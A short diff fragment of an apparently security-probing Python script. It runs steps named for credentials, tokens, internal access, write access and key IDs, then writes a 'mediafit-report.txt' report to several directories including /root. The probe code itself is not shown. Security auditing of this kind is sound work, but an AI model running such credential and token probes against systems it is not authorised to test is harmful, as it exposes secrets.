+    for n,f in [("creds",s_creds),("tokens",s_tokens),("internal",s_internal),
+                ("write",s_write),("range",s_range),("kid",s_kid),("verdict",s_verdict)]:
         step(n,f)
 try: main()
 except Exception as e: w("!! %s"%e); w(traceback.format_exc())
 finally:
-    txt = "\n".join(OUT)
+    txt="\n".join(OUT)
     for d in [OUTD,"/tmp","/root"]:
         try: os.makedirs(d,exist_ok=True); open(d+"/mediafit-report.txt","w").write(txt)
         except Exception: pass
-    print("\nreport -> " + OUTD + "/mediafit-report.txt")
+    print("\nreport -> "+OUTD+"/mediafit-report.txt")
